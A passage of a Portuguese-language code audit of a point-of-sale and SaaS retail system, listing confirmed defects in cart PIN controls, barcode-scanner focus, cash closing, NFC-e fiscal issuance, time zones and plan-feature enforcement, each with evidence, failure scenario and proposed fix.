- **Correção:** No handler do seletor, `history.replaceState(null,"","/app/?tenant="+encodeURIComponent(id)+location.hash)` (ou remover o parâmetro da URL logo após o init).

### Controle de PIN na remoção de item é contornável reduzindo a quantidade ou clicando em 'Nova venda'

- **Onde:** `terminal/static/terminal.js:329` · área `terminal-js` · categoria `money` · confirmado
- **Evidência:** Em renderCart, o botão `[data-remove]` exige PIN de gerente para cashier (`/api/cart/items/authorize-remove`), mas o `onchange` do campo `[data-qty]` aceita qualquer quantidade > 0 sem autorização, e startNewSale (linha 333) executa resetCart() apenas com confirmDialog. O backend (store.authorize_item_removal, store.py:1071) só grava auditoria; o carrinho vive no navegador.
- **Cenário de falha:** Caixa passa 12 cervejas, informa o total ao cliente, recebe em dinheiro, altera a quantidade para 1 (ou clica em Nova venda e relança só 1) e registra a venda menor; a diferença fica com ele sem nenhum PIN nem registro de auditoria.
- **Correção:** Aplicar a mesma autorização (PIN para cashier + auditoria com produto/quantidade/valor) à redução de quantidade e ao descarte do carrinho com itens; registrar no audit o conteúdo descartado. Idealmente manter o carrinho no backend para que o controle não dependa do front.

### Carrinho guarda preço congelado e cotação de promoção em cache; divergência do backend trava venda em Pix/cartão

- **Onde:** `terminal/static/terminal.js:305` · área `terminal-js` · categoria `correctness` · confirmado
- **Evidência:** addProduct faz `state.cart.push({...p,quantity_milli})` (linha 293) e cartGross usa `p.price_cents` dessa cópia (295); o polling recarrega state.products mas nunca o carrinho. refreshQuote retorna cedo com `if(state.quote?.key===key)return` e a chave é só `[id,quantidade]` (303-308), então o `await refreshQuote(true)` de submitSale (348) não recota. O backend reprecifica com preço e promoções atuais e exige `change<0 or change>cash_paid` → 'Pagamentos não fecham o total; troco exige dinheiro' (store.py:1207-1209).
- **Cenário de falha:** Promoção de horário termina às 18h (ou o gerente altera preço no painel) com um carrinho aberto. A tela mostra R$ 8,00 e preenche Pix R$ 8,00; o backend calcula R$ 10,00 e recusa com mensagem que não explica a causa. Repetir não resolve porque a cotação está em cache; o caixa precisa remover e relançar itens (com PIN de gerente). Em dinheiro, o troco exibido antes de confirmar difere do troco gravado.
- **Correção:** Fazer /api/cart/quote devolver preço unitário, bruto e total autoritativos e usar esses valores na tela; sempre recotar em submitSale (ignorar o cache) e ao detectar novo bootstrap_at; se o total mudar, atualizar o diálogo e pedir nova conferência em vez de enviar.

### Enter do leitor de código de barras confirma diálogos abertos (foco inicial no botão de aceitar)

- **Onde:** `terminal/static/terminal.js:61` · área `terminal-js` · categoria `ux-bug` · confirmado
- **Evidência:** confirmDialog termina com `accept.focus()` (linha 61) e receiptDialog com `browserPrint.focus()` (linha 175). A captura global do leitor sai cedo com `if(activeConfirm)return` (linha 486), então os dígitos são descartados e o Enter final do leitor aciona o botão focado.
- **Cenário de falha:** Caixa toca em 'Nova venda' sem querer e bipa o próximo produto: o Enter confirma e o carrinho inteiro é apagado. Na aba Vendas, com 'Confirmar cancelamento' aberto, um bip cancela a venda. Depois de cada venda, bipar o primeiro item do próximo cliente com o comprovante aberto perde a leitura e abre o diálogo de impressão do sistema.
- **Correção:** Em diálogos, detectar rajada de leitor (mesma heurística de scannerCapture) e engolir o Enter; focar o botão Cancelar/Fechar em confirmações destrutivas; no comprovante, fechar automaticamente e encaminhar a leitura para o carrinho quando um código for bipado.

### Após a venda o foco fica no botão 'Revisar e confirmar'; digitação manual é engolida e a captura global ignora a aba ativa

- **Onde:** `terminal/static/terminal.js:485` · área `terminal-js` · categoria `ux-bug` · confirmado
- **Evidência:** checkoutConfirmDialog e receiptDialog devolvem o foco com `previous?.focus?.()` (linhas 391 e 173), que é o sellBtn; focusScannerInput() em loadSession retorna porque o elemento ativo é um botão (linha 195). O handler global faz `if(now-scannerCapture.lastAt>150)scannerCapture.buffer=''` e `if(!targetIsEditable)event.preventDefault()` (505-508) e não verifica state.tab.
- **Cenário de falha:** Depois de qualquer venda, o caixa digita um código no teclado: cada tecla é cancelada e nada aparece no campo até apertar F2 ou clicar; Enter dispara o botão e mostra 'Adicione um produto'. Na aba Vendas ou Impressoras, um bip com foco em um botão adiciona o produto ao carrinho oculto sem aviso, e o item fantasma entra na próxima venda.
- **Correção:** Ao fechar comprovante/diálogo de venda e ao entrar na aba Caixa, focar #productSearch explicitamente. Na captura global, quando o alvo não for editável e a aba for checkout, redirecionar a tecla para o campo de busca (focar e inserir) em vez de descartar; ignorar a captura fora da aba Caixa.

### Venda acima do limite de fiado: o pedido de PIN fecha o diálogo de conferência; comprovante não aparece e erro de PIN some

- **Onde:** `terminal/static/terminal.js:357` · área `terminal-js` · categoria `correctness` · confirmado
- **Evidência:** submitSale chama `textDialog('Autorizar venda acima do limite',...)` de dentro do diálogo de conferência; textDialog começa com `if(activeConfirm)activeConfirm(false)` (linha 65), que executa o `finish` do checkoutConfirmDialog e resolve com false. Em checkout(), `if(result)await receiptDialog(...)` (417) não roda; no catch de submit (404) o erro é escrito num nó já removido do DOM.
- **Cenário de falha:** Fiado de R$ 300 com R$ 200 disponíveis: gerente digita o PIN, a venda é gravada, mas o comprovante não abre (sem térmica configurada, o cliente sai sem via; só há um toast). Se o PIN estiver errado, a tela volta ao caixa sem mensagem alguma e o operador não sabe se a venda foi registrada.
- **Correção:** Permitir diálogo aninhado (pilha de diálogos em vez de um único activeConfirm) ou pedir o PIN em um campo dentro do próprio diálogo de conferência; garantir que o resultado de submitSale sempre leve ao receiptDialog e que erros apareçam em toast.

### Fechamento de caixa vem com o valor contado pré-preenchido com o esperado e o resumo omite fiado, outras formas e devoluções

- **Onde:** `terminal/static/terminal.js:420` · área `terminal-js` · categoria `money` · confirmado
- **Evidência:** cashCloseDialog: `input.value=(summary.expected_cents/100).toLocaleString(...)` e o bloco 'Dinheiro esperado' é exibido antes da contagem. cashSummaryMarkup (linha 419) só lista dinheiro, PIX, crédito, débito, suprimentos e sangrias e usa `summary.total_channels_cents||summary.sales_total_cents` como 'Total geral das vendas'; total_channels (store.py:1003-1005) exclui credit_account, store_credit e 'other', e o esperado inclui cash_refunds e credit_received_cash que não aparecem.
- **Cenário de falha:** Operador com R$ 80 a menos na gaveta aperta 'Fechar caixa' sem contar: o campo já traz o esperado e o turno fecha como 'Fechamento exato', escondendo a falta. Em turno com R$ 100 no fiado, R$ 60 em vale (forma 'outra') e R$ 50 em Pix, o 'Total geral das vendas' mostra R$ 50; com devolução em dinheiro ou fiado recebido, o 'Dinheiro esperado' não bate com as linhas exibidas.
- **Correção:** Fechamento cego: campo vazio e esperado oculto até a contagem ser enviada (mostrar a diferença só depois). Incluir no resumo fiado vendido, crédito loja, cada forma 'other', devoluções em dinheiro e fiado recebido; usar sales_total_cents como total geral.

### Duplo clique em 'Registrar ajuste' aplica o ajuste de estoque duas vezes

- **Onde:** `terminal/static/terminal.js:469` · área `terminal-js` · categoria `data-loss` · confirmado
- **Evidência:** O helper `on()` (linha 438) não bloqueia reentrada nem desabilita o botão; o handler de adjustStockBtn lê os campos, faz `await api('/api/stock/adjust',...)` e só depois limpa `stockDelta`. Store.adjust_stock (store.py:1497-1520) não recebe chave de idempotência: cada POST gera novo adjustment_id e novo evento stock.adjusted.
- **Cenário de falha:** Gerente lança +24 de um produto e dá duplo clique (ou duplo toque na tela): dois POSTs com o mesmo delta, estoque sobe 48 e dois eventos são sincronizados para a nuvem. O estoque local e o da empresa ficam errados até alguém perceber.
- **Correção:** Desabilitar o botão durante a requisição (guard de in-flight no helper `on`) e enviar um adjustment_id gerado no cliente, tratado como chave idempotente no backend.

### Etiqueta de balança em modo 'Preço total' converte o preço em peso e o total cobrado difere do impresso na etiqueta

- **Onde:** `terminal/static/terminal.js:21` · área `terminal-js` · categoria `money` · confirmado
- **Evidência:** decodeScaleBarcode: `milli=Math.round(encodedCents*1000/Number(product.price_cents))`; a venda envia só quantity_milli e o backend recalcula `_line_gross(price, milli)`. O dígito verificador do EAN-13 também não é validado (`/^2\d{12}$/`).
- **Cenário de falha:** Produto a R$ 24,90/kg com etiqueta de R$ 10,00: milli=round(1.000.000/2490)=402 e o total vira round(2490×402/1000)=R$ 10,01. A R$ 89,90/kg o erro chega a ±4 centavos por item. Se o preço por kg mudou depois da etiquetagem, o peso (e a baixa de estoque) saem errados e o cliente paga valor diferente do rótulo.
- **Correção:** No modo preço, levar o valor da etiqueta como total da linha (campo próprio, ex.: line_total_override_cents validado no backend contra preço×peso com tolerância) em vez de derivar o peso; validar o dígito verificador antes de decodificar.

### Papel 'Estoque' não consegue abrir a aba Estoque no terminal

- **Onde:** `terminal/templates/index.html:20` · área `terminal-js` · categoria `correctness` · confirmado
- **Evidência:** `<button class="nav-item admin-only" data-tab="stock">` e applyRoleUi (terminal.js:200) faz `document.querySelectorAll('.admin-only').forEach(node=>node.classList.toggle('hidden',!manager))`, com manager = owner/admin/manager. Mas canAdjustStock (linha 6) e a rota /api/stock/adjust (app.py:353) aceitam 'inventory'.
- **Cenário de falha:** Funcionário com papel Estoque entra com o PIN para lançar um ajuste: só vê a aba Vendas (com botões Devolver/Cancelar que retornam 403) e não tem como chegar ao formulário de ajuste que o backend permitiria.
- **Correção:** Trocar a classe da aba Estoque por uma regra própria (`canAdjustStock(role)`) em applyRoleUi e levar o papel inventory direto para essa aba; esconder ações de venda para papéis sem SELL_ROLES.

### Venda suspensa (espera) está implementada no backend e no JS, mas não existe na tela

- **Onde:** `terminal/static/terminal.js:423` · área `terminal-js` · categoria `ux-bug` · confirmado
- **Evidência:** loadSuspended usa `$('suspendedList')` e suspend() nunca é ligado a nenhum botão; index.html não contém `suspendedList` nem botão de suspender, e nenhuma chamada a loadSuspended()/suspend() existe no arquivo. As rotas /api/carts/suspended existem (app.py:336-350) e docs/STATUS-V2.md linha 9 lista 'suspensão' como função do terminal.
- **Cenário de falha:** Cliente esquece a carteira com 30 itens passados: o caixa não tem como guardar a venda para atender o próximo; precisa apagar tudo (Nova venda) e relançar depois. Se alguém chamar loadSuspended, quebra com TypeError em `$('suspendedList').innerHTML`.
- **Correção:** Adicionar botão 'Suspender venda' e lista 'Vendas em espera' na frente de caixa, com atalho; ao retomar, recarregar os produtos pelo id para atualizar preço/estoque em vez de usar o snapshot salvo.

### Grade de produtos e categorias dependem da lista truncada em 150; após Enter a grade fica filtrada com busca vazia, e resultado único é adicionado mesmo sem o código bater

- **Onde:** `terminal/static/terminal.js:454` · área `terminal-js` · categoria `ux-bug` · confirmado
- **Evidência:** renderProducts monta os chips com `availableCategories=[...new Set(available.map(p=>p.category))]` (linha 279) e ignora state.categories; /api/products devolve no máximo 150 (store.py:924). processScannerInput faz `if(!product&&(result.products||[]).length===1)product=result.products[0]`, depois `state.products=result.products; ... $('productSearch').value=''; renderProducts()` sem recarregar o catálogo.
- **Cenário de falha:** Com 800 produtos, categorias cujos itens ficam depois do 150º nome nunca aparecem como chip; ao escolher uma categoria, os outros chips somem. Operador digita o código '1005' (inexistente) e Enter: se só um produto tiver '1005' no nome ou SKU (ex.: SKU 11005), ele entra no carrinho com status 'Produto adicionado'. Depois disso a busca fica vazia mas a grade mostra só aquele produto.
- **Correção:** Usar state.categories (lista completa do backend) nos chips; paginar/buscar a grade no servidor. Só adicionar automaticamente em correspondência exata de código; para busca por nome, exigir toque no produto. Após adicionar, chamar loadProducts() com a busca limpa.

### Cancelamento comercial passa enquanto a NFC-e ainda está em fila ou processamento, e a nota é autorizada depois para uma venda cancelada

- **Onde:** `cloud/core/sale_logic.py:199` · área `fiscal-ponta-a-ponta` · categoria `concurrency` · confirmado
- **Evidência:** O bloqueio só considera `status__in=("authorized", "cancel_pending")` (l.199); `cancel_pending` não é atribuído em nenhum lugar do código. Documentos `queued`, `pending` e `processing` não bloqueiam. O worker `fiscal_submit` (operations/services.py l.163-176) envia sem reconferir `sale.status`, e `fiscal_result` grava `record.sale.fiscal_status=state` (l.159) mesmo em venda cancelada.
- **Cenário de falha:** Venda sincronizada, emissão solicitada, SEFAZ lenta (documento em `processing`, com poll por até 30 tentativas). O operador estorna a venda no caixa ou o gerente cancela no painel: passa, o estoque volta. Minutos depois o poll recebe `autorizado`. Resultado: NFC-e válida de uma venda cancelada, sem alerta; se ninguém notar dentro do prazo de cancelamento, o imposto é devido.
- **Correção:** Bloquear (ou marcar como pendência) o cancelamento também para documentos `queued/pending/processing`; no worker, reler a venda com lock antes do POST e abortar se não estiver `completed`; em `fiscal_result`, se a venda estiver cancelada e a nota vier autorizada, enfileirar cancelamento fiscal automático e registrar alerta.

### Seletor 'Emissão fiscal' da empresa não tem efeito e é independente do ambiente da credencial Focus

- **Onde:** `operations/views.py:58` · área `fiscal-ponta-a-ponta` · categoria `correctness` · confirmado
- **Evidência:** `fiscal_environment` é validado e salvo (l.58-62), devolvido (l.102) e enviado ao terminal (views_terminal.py l.77), mas nenhum código o lê para decidir algo. `fiscal_submit` consulta apenas `IntegrationAccount...enabled=True` (l.196), cujo ambiente é outro campo (l.118-126). O painel oferece 'NFC-e em produção · requer provedor' (web/assets/app.js l.2661) e a API aceita sem verificar provedor, CNPJ, IE ou NCM.
- **Cenário de falha:** (a) O dono seleciona 'NFC-e em produção' e salva. Nada muda: o caixa segue imprimindo 'COMPROVANTE NAO FISCAL / NFC-e nao emitida' e nenhuma nota é emitida, mas o cadastro da empresa indica produção e a loja opera acreditando estar fiscal. (b) Empresa marcada como 'homologação' com a credencial Focus salva como 'production': um envio de teste pela API gera NFC-e com valor fiscal.
- **Correção:** Ter uma única fonte de verdade: derivar o ambiente da integração (ou recusar `fiscal_submit` quando `tenant.fiscal_environment` for `non_fiscal` ou divergir de `IntegrationAccount.environment`). Só aceitar `homologation/production` no PATCH se houver integração ativa, CNPJ de 14 dígitos, IE e endereço completos; exibir alerta permanente no painel e no caixa enquanto o modo fiscal estiver selecionado sem emissão automática.

### Validação do payload fiscal confere só total, emitente, código e quantidade; valores por item, desconto, pagamentos, CPF e data de emissão passam sem checagem

- **Onde:** `operations/views.py:200` · área `fiscal-ponta-a-ponta` · categoria `correctness` · confirmado
- **Evidência:** As únicas comparações são `total!=sale.total_cents` (l.200-202), emitente (l.203-205) e, por item, `codigo_produto` e `quantidade_comercial` (l.208-212). Nada compara valor unitário/bruto, desconto rateado (SaleItem.discount_cents/promo_discount_cents), formas de pagamento e troco (SalePayment, Sale.change_cents), CPF/CNPJ do consumidor (customer_document_snapshot) ou data de emissão (Sale.created_at).
- **Cenário de falha:** Integração monta o payload com as formas de pagamento todas como dinheiro numa venda paga em cartão/Pix, ou omite o CPF que o cliente pediu na nota, ou usa data de emissão diferente da venda. A API aceita (total e quantidades conferem) e a nota é autorizada com dados que divergem da venda registrada: cruzamento da SEFAZ com adquirentes aponta divergência e o consumidor perde o crédito do programa de nota fiscal. Valores de item que não somam o total só aparecem como rejeição da SEFAZ, que hoje não pode ser corrigida.
- **Correção:** Gerar o payload no servidor a partir da venda (itens com valor e desconto por linha, pagamentos mapeados por método, troco, CPF do snapshot, data da venda) e aceitar do chamador apenas os campos tributários; enquanto o payload vier de fora, validar soma dos itens, desconto por linha, soma e tipo dos pagamentos, troco e documento do consumidor contra a venda.

### Nota autorizada não gera DANFE em lugar nenhum: chave, número, QR Code e link não são expostos e a lista de documentos é cortada em 100

- **Onde:** `operations/views.py:226` · área `fiscal-ponta-a-ponta` · categoria `correctness` · confirmado
- **Evidência:** `fiscal_documents` devolve apenas id, sale_id, status, reference, authorization, error_message, created_at e xml_archived, com `[:100]` fixo e sem paginação ou filtro (l.226-229). `fiscal_result` guarda só protocolo e caminho do XML (operations/services.py l.155-156); chave, número, série e URLs ficam apenas em FiscalPayload.provider_response. O terminal nunca recebe estado fiscal: nenhum código preenche `sale["fiscal"]`, então `authorized` em terminal/printers.py l.132 é sempre falso e o cupom imprime 'NFC-e nao emitida / Documento sem valor fiscal' (l.247-248).
- **Cenário de falha:** NFC-e autorizada pela API: o cliente no balcão recebe (e na reimpressão continua recebendo) um cupom dizendo que não há nota, e o painel não mostra chave nem QR Code para entregar ou consultar. Mercado que emite 300 notas por dia: no dia seguinte as notas anteriores às 100 mais recentes somem da tela, sem como baixar o XML ou solicitar cancelamento pelo painel, e não há exportação em lote para o contador.
- **Correção:** Persistir em FiscalDocument número, série, chave, data de autorização, URL do QR Code e de consulta; expor esses campos e paginar/filtrar `fiscal_documents` por período e estado, com exportação em lote dos XMLs. Entregar o estado fiscal ao terminal (resposta da emissão ou canal de retorno no sync) para imprimir o DANFE e reimprimir corretamente.

### Fuso horário fixo em America/Sao_Paulo para comprovantes e para o corte diário de relatórios, sem fuso por empresa ou loja

- **Onde:** `terminal/printers.py:92` · área `fiscal-ponta-a-ponta` · categoria `correctness` · confirmado
- **Evidência:** `_receipt_date` converte sempre para `ZoneInfo("America/Sao_Paulo")` (l.92-95); o teste fixa isso ('Sao Paulo; independent of host TZ', terminal/tests/test_receipts.py l.34). `TIME_ZONE = "America/Sao_Paulo"` (cloud/pdvcloud/settings.py l.92) rege `created_at__date` e `timezone.localdate()` (views_sales.py l.111-115, views_reports.py). Tenant e Shop não têm campo de fuso. Já o horário de funcionamento usa o relógio local da máquina (`datetime.now()`, terminal/store.py l.476).
- **Cenário de falha:** Loja em Manaus, Cuiabá, Porto Velho ou Rio Branco: o comprovante impresso sai 1 a 2 horas adiantado em relação ao relógio da loja (e ao horário que o próprio caixa usa para abrir/fechar). Vendas feitas na última hora (ou duas) do dia local entram no dia seguinte nos relatórios, comissões e fechamento por data do painel. Uma futura data de emissão montada com esse fuso herdaria o mesmo erro de offset.
- **Correção:** Adicionar fuso (ou derivar da UF) em Shop/Tenant, enviá-lo no perfil do emitente, usá-lo em `_receipt_date` e ativar o fuso da empresa por requisição no Django (`timezone.override`) para os filtros por data; a data de emissão fiscal deve usar o offset da UF do emitente.

### CPF/CNPJ do consumidor é texto livre de 30 caracteres, sem validação no caixa nem na nuvem

- **Onde:** `terminal/store.py:1115` · área `fiscal-ponta-a-ponta` · categoria `correctness` · confirmado
- **Evidência:** `customer_document = str(request.get("customer_document") or "").strip()[:30]` (terminal/store.py l.1115); na nuvem `text(data.get("customer_document", ""), ..., 30, optional=True)` (cloud/core/sale_logic.py l.47). `_document` só formata se houver 11 ou 14 dígitos e, senão, imprime o texto como veio (terminal/printers.py l.69-75, l.215-216). Não há cálculo de dígito verificador em nenhum ponto.
- **Cenário de falha:** Operador digita o CPF do cliente com um dígito trocado ou incompleto. O cupom imprime 'CPF/CNPJ: 1234567890' e a venda é gravada assim. Quando esse documento for usado como destinatário da NFC-e, a SEFAZ rejeita por CPF inválido e, pelo defeito do reenvio, a venda fica sem nota; o cliente também perde o registro da compra no CPF.
- **Correção:** Validar no terminal (UI e `Store.sale`) e em `validate_sale`: somente dígitos, 11 ou 14, com dígitos verificadores; recusar a venda com mensagem clara ou permitir seguir sem documento.

### Cadastro tributário do produto não é validado nem usado: tax_fields aceita qualquer objeto, NCM de 7 dígitos é aceito e a classificação não é gravada na venda

- **Onde:** `cloud/core/views_resources.py:117` · área `fiscal-ponta-a-ponta` · categoria `correctness` · confirmado
- **Evidência:** `tax_fields`: `if not isinstance(value, dict) or len(str(value)) > 16000` e grava (l.117-120); nenhum código lê o campo, ele não vai no bootstrap do terminal (views_terminal.py l.284-292), não é copiado para variações (product_groups.py l.119, l.153) e não aparece no painel. NCM: `len(value) not in (7, 8)` (l.136-139), opcional mesmo com empresa em modo fiscal. O `ncm` enviado pelo caixa no item é aceito e descartado (sale_logic.py l.62; SaleItem não tem a coluna) e o detalhe da venda mostra `x.product.ncm` atual (serializers.py l.115).
- **Cenário de falha:** Produto cadastrado com NCM de 7 dígitos (ou sem NCM) e sem CFOP/CSOSN/origem: é vendido normalmente, e qualquer NFC-e com ele é rejeitada por NCM inexistente. Integração grava `tax_fields` com chaves erradas ('csosn' x 'CSOSN') e nada acusa. Se o NCM do produto for corrigido depois, o detalhe da venda antiga passa a mostrar o NCM novo, diferente do que foi impresso no cupom.
- **Correção:** Definir esquema de `tax_fields` (origem, CFOP, CSOSN/CST conforme `tax_regime`, CEST, alíquotas, PIS/COFINS) com validação; exigir NCM de 8 dígitos e dados mínimos quando a empresa estiver em modo fiscal; copiar para variações; enviar ao terminal; gravar NCM e tributação como snapshot em SaleItem.

### Série e 'Próximo número NFC-e' são campos decorativos: nada consome nem incrementa, o formulário os regrava a cada salvamento e não há inutilização

- **Onde:** `operations/views.py:63` · área `fiscal-ponta-a-ponta` · categoria `correctness` · confirmado
- **Evidência:** `nfce_series`/`nfce_next_number` só são lidos e gravados em `company` (l.63-67, l.103) e a série vai ao terminal (views_terminal.py l.78); nenhum outro código os usa, não há alocação com lock. Faixas aceitas: série 1..999 e número até 10**12. O formulário 'Minha empresa' envia sempre `nfce_series` e `nfce_next_number` no PATCH (web/assets/app.js l.2680-2681). O conector só tem submit/get/cancel de /v2/nfce (integrations/fiscal.py l.27-41).
- **Cenário de falha:** Loja que migra de outro emissor informa 'Próximo número 15001'. O valor não é usado em lugar nenhum; se o payload não trouxer número, a numeração segue o cadastro do provedor e a SEFAZ rejeita por duplicidade ou cria um salto. Cada rejeição abandonada deixa número sem uso e não existe chamada de inutilização. Se um dia a emissão passar a incrementar o campo, qualquer gravação de 'Minha empresa' (por exemplo, mudar horário) com a tela aberta há algum tempo regrava o contador com valor antigo.
- **Correção:** Ou remover os campos e documentar que a numeração é do provedor, ou implementar alocação atômica (`select_for_update` em Tenant/Shop, por série e por terminal em contingência) gravando número e série no FiscalDocument; limitar série a 1..889 e número a 999999999; não enviar o contador no PATCH geral; implementar inutilização de faixa no conector.

### Papel platform_billing concede acesso gratuito por tempo indeterminado via edição manual, contornando o VIP restrito a superusuário, e a auditoria não guarda os valores

- **Onde:** `cloud/core/views_platform.py:299` · área `planos-permissoes-matriz` · categoria `security` · confirmado
- **Evidência:** subscription_vip exige superuser=True e verificação no Asaas (l.351, 371-384), mas subscription_detail PATCH (roles={'platform_billing'}, l.299) aceita status='active' + current_period_end arbitrário + qualquer plano, marca license_source='manual' (l.340-341) e ainda recebe +72h de carência (api_common.py:161-162). audit grava apenas {'fields': list(data)} (l.343), sem plano, data nem motivo.
- **Cenário de falha:** Um funcionário do financeiro coloca a loja de um conhecido no Avançado com período até 2036. O registro de auditoria mostra só 'fields: [plan, status, current_period_end]'; não há como saber o que foi concedido nem por quê, e o resultado é igual ao VIP que deveria depender do superusuário.
- **Correção:** Exigir motivo obrigatório e gravar valores antes/depois na auditoria; limitar a extensão manual (ex.: até 35 dias) para platform_billing e deixar concessões longas ou gratuitas apenas no fluxo VIP.

### Editar assinatura pelo painel SaaS sempre reenvia plano, estado e datas: vira 'manual', desloca o fim do período e o estorno/chargeback deixa de suspender

- **Onde:** `web/assets/app.js:2892` · área `planos-permissoes-matriz` · categoria `money` · confirmado
- **Evidência:** subscriptionEdit envia sempre plan_id e status (campos required) e regrava current_period_end como data+'T12:00:00Z' (app.js:2887-2895). O servidor, ao ver plan/status/current_period_end, define license_source='manual' (views_platform.py:340-341). reconcile_payment só marca past_due em estorno se 'sub.current_period_end==period_end' (operations/services.py:101) e o MRR só soma license_source='subscription' (operations/views.py:310-311).
- **Cenário de falha:** Financeiro abre 'Editar' numa assinatura paga e salva sem mudar nada (ou só para conferir). O fim do período passa de 00:00 local para 12:00Z e a origem vira manual. Se o cliente contestar essa cobrança no cartão/boleto, o webhook de refund não encontra período igual e a empresa continua ativa até o fim do ciclo; a assinatura também some do MRR até a próxima fatura. Em assinatura VIP, o simples salvar remove o VIP e dá 72h extras.
- **Correção:** Enviar no PATCH apenas os campos realmente alterados; no servidor, ignorar valores iguais aos atuais antes de mexer em license_source; comparar estorno por external_id/fatura em vez de igualdade exata de data.

### Assinatura de empresa em plano desativado não pode mais ser editada pelo painel SaaS (sempre 404 'Plano não encontrado')

- **Onde:** `cloud/core/views_platform.py:312` · área `planos-permissoes-matriz` · categoria `correctness` · confirmado
- **Evidência:** O PATCH valida 'Plan.objects.filter(pk=..., active=True)' (l.311-314) sempre que plan_id vem no corpo; o formulário inclui o plano atual mesmo inativo na lista (app.js:2882: plan.active||plan.id===row.plan?.id) e o envia obrigatoriamente (app.js:2892).
- **Cenário de falha:** A plataforma desmarca 'Plano disponível para novas assinaturas' num plano antigo para tirá-lo de venda. Meses depois precisa suspender, cancelar ou estender uma empresa que ainda está nele: todo salvamento retorna 404 e o financeiro não consegue alterar o estado sem trocar a empresa de plano.
- **Correção:** Aceitar plan_id inativo quando for igual ao plano atual da assinatura (exigir active=True só quando o plano muda) e não enviar plan_id inalterado.

### Recursos do plano são JSON livre sem catálogo: erro de digitação desliga módulo pago de todos os assinantes na hora, sem aviso, sem versão e sem registro do valor anterior

- **Onde:** `cloud/core/views_platform.py:246` · área `planos-permissoes-matriz` · categoria `correctness` · confirmado
- **Evidência:** _plan_values valida apenas 'lista de textos até 80 caracteres' (l.246-248); o formulário é um textarea 'Recursos (JSON)' (web/assets/app.js:2838). require_feature compara string exata (api_common.py:171). A linha Plan é compartilhada por todos os assinantes e o audit guarda só {'fields': [...]} (l.282).
- **Cenário de falha:** Ao editar o plano Gestão alguém salva ["cloud_dashboard","stock","finace","reports"]. Imediatamente todos os clientes Gestão recebem 403 em Financeiro e Comissões e o menu some; a landing passa a exibir 'finace' como item do plano (landing.js:40) e a tela Assinatura mostra os códigos crus (app.js:2609-2611). Não há como ver na auditoria qual era a lista anterior. O mesmo vale para remover um recurso de propósito: clientes com plano anual pago perdem o módulo no meio do contrato.
- **Correção:** Definir catálogo de recursos no servidor (constante com código + rótulo), rejeitar códigos desconhecidos no POST/PATCH, trocar o textarea por checkboxes, gravar features antigas/novas na auditoria e avisar quantas empresas serão afetadas; para mudanças de escopo, criar novo plano em vez de mutar o existente.

### O recurso 'stock' só esconde menu no painel; servidor e terminal não aplicam nenhum recurso além de finance/reports/cloud_dashboard

- **Onde:** `web/assets/app.js:39` · área `planos-permissoes-matriz` · categoria `correctness` · confirmado
- **Evidência:** tenantNav usa feature:'stock' em Inventário e Estoque (app.js:39, 42), mas nenhum endpoint chama require_feature('stock'): views_stock, views_inventory, views_transfers, views_purchases, views_promotions, product_groups, views_payment_methods, views_labels e /ops/fiscal/* só checam papel. 'pdv_local' e 'priority_support' (migrations/0002_seed_plans.py:8-12) nunca são lidos. O terminal recebe features no lease e apenas as devolve em lease_status (terminal/store.py:471); terminal.js não usa.
- **Cenário de falha:** A plataforma cria um plano 'Caixa' mais barato sem 'stock' (o próprio texto de ajuda do formulário sugere a lista). O menu some, mas POST /api/v1/stock/movements, /inventories, /transfers e /purchases/nfe/import continuam funcionando e o terminal segue ajustando estoque: o módulo não foi vendido e é usado. Hoje o Essencial recebe promoções, inventário, transferências, importação de NF-e, grade, etiquetas, formas de pagamento e emissão fiscal sem qualquer distinção de plano.
- **Correção:** Aplicar require_feature nos endpoints de cada módulo (e decidir explicitamente quais ficam em todos os planos), remover do seed os códigos sem efeito ou dar efeito a eles, e fazer o terminal respeitar os recursos do lease onde fizer sentido.

### Planos sem Financeiro geram contas a pagar e comissões invisíveis (importação de NF-e e comissão de vendedores)

- **Onde:** `cloud/core/views_purchases.py:179` · área `planos-permissoes-matriz` · categoria `data-loss` · confirmado
- **Evidência:** nfe_import cria FinanceEntry 'payable' por parcela com create_payables padrão True (l.179-188) sem checar o recurso 'finance'; commission_logic.accrue cria Commission em toda venda com taxa > 0 (commission_logic.py:20-36). O painel oferece 'Comissão sobre vendas (%)' e comissão por categoria em qualquer plano (app.js:475, 2439), mas /finance e /commissions respondem 403 sem 'finance' (views_finance.py:30, views_commissions.py:43).
- **Cenário de falha:** Mercearia no Essencial importa as NF-e dos fornecedores e cadastra 2% de comissão para o vendedor. Os títulos e comissões se acumulam sem tela para ver, liquidar ou cancelar. Ao subir para o Gestão, aparecem meses de contas a pagar 'em aberto' já quitadas por fora, o fluxo de caixa previsto (views_reports.py:226) e o 'Contas a pagar' do painel ficam errados, e 'Pagar comissão' gera um único título com todo o acumulado.
- **Correção:** Só criar payables e acumular comissão quando o plano tiver 'finance' (ou deixar esses dois fluxos em todos os planos com tela própria); esconder os campos de comissão e a opção 'gerar contas a pagar' quando o recurso não existir.

### Downgrade de plano não trata dados dos módulos removidos: financeiro fica trancado sem exportação e os totais do painel zeram

- **Onde:** `cloud/core/views_platform.py:328` · área `planos-permissoes-matriz` · categoria `data-loss` · confirmado
- **Evidência:** Na troca de plano só se confere lojas e terminais (l.328-331). Depois disso require_feature('finance') bloqueia GET, PATCH, DELETE e settle de FinanceEntry (views_finance.py:30, 62, 105) e de comissões (views_commissions.py:43-68); require_feature('reports') bloqueia inclusive o CSV (views_reports.py:291).
- **Cenário de falha:** Empresa sai do Gestão para o Essencial com 40 contas a pagar abertas e comissões pendentes. Ela não consegue mais listar, liquidar, cancelar nem exportar esses títulos; as comissões continuam acumulando sem poder pagar; o painel passa a mostrar R$ 0,00 em contas a pagar/receber. Os dados só voltam se pagar o plano superior de novo.
- **Correção:** No downgrade, manter leitura e exportação (somente leitura) dos módulos removidos, avisar a plataforma/empresa da quantidade de registros abertos e parar de gerar dados novos desses módulos.

### Painel mostra 'Contas a receber R$ 0,00' no Essencial mesmo com fiado em aberto

- **Onde:** `cloud/core/views_sales.py:120` · área `planos-permissoes-matriz` · categoria `correctness` · confirmado
- **Evidência:** dashboard só soma FinanceEntry se 'finance' estiver no plano; caso contrário devolve payable = receivable = 0 (l.120-126). A tela exibe sempre o quadro 'Financeiro em aberto' com os dois valores (web/assets/app.js:973-977), sem condicionar a hasFeature('finance'). O fiado é vendido em todos os planos (views_customer_credit.py:1) e gera FinanceEntry receivable.
- **Cenário de falha:** Mercearia no Essencial com R$ 8.000 de fiado em aberto abre a Visão geral e lê 'Contas a receber: R$ 0,00'. O dono conclui que não há nada a cobrar; o valor real só aparece em Clientes.
